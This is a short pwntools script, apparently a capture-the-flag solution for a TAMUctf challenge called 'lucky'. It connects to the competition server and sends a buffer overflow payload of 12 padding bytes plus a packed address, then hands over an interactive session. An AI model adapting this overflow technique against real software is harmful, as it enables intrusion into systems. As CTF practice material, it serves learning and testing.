from pwn import *

p = remote("tamuctf.com", 443, ssl=True, sni="lucky")
#p = process("./lucky")
raw_input("DEBUG")
payload = b"A"*12
payload += p64(0x563412)

p.sendline(payload)

p.interactive()
